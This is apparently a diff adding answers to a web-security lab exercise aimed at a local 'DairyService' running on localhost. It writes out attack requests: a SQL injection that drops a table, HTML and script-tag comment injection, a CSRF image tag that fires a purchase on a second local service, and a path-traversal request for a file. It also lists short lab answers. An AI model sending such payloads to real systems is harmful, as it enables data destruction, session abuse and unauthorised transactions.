@@ -1,0 +1,66 @@
+N01:
+GET  http://localhost:8188/DairyService.svc/search?term=sqlinjection%27;%20DROP%20TABLE%20Items;
+
+N02:
+POST http://localhost:8188/DairyService.svc/comment?name=
+HOST: localhost:8188
+Content-Type: application/json
+Content-length:22
+
+<p><em>Hi</em></p>
+
+N03:
+POST http://localhost:8188/DairyService.svc/comment?name=
+HOST: localhost:8188
+Content-Type: application/json
+Content-length:120
+
+<img src="https://images.pexels.com/photos/736230/pexels-photo-736230.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" />
+
+
+
+
+
+
+
+N04:
+POST http://localhost:8188/DairyService.svc/comment?name= 
+HOST: localhost:8188
+Content-Type: application/json
+Content-length: 46
+
+<script>alert(‘im not hacker’);</script>
+
+N05:
+A user log in this web, a hacker injected a image refer to the buy server,  when user look at comment page, it send a buy request using password and username stored in the  Javascript.
+
+N06:
+POST  http://localhost:8188/DairyService.svc/comment?name= 
+HOST: localhost:8188
+Content-Type: application/json
+Content-length: 68
+
+<img src="http://localhost:8189/Service.svc/buy?id=248309259” /> 
+
+C01:
+SQLite
+
+C02:
+Three tables
+
+C03:
+shavon
+
+C04:
+careful
+
+C05:
+Get http://localhost:8188/DairyService.svc/itemimg?id=../HugeImages/ciquonahi
+
+
+
+
+
+
+
+
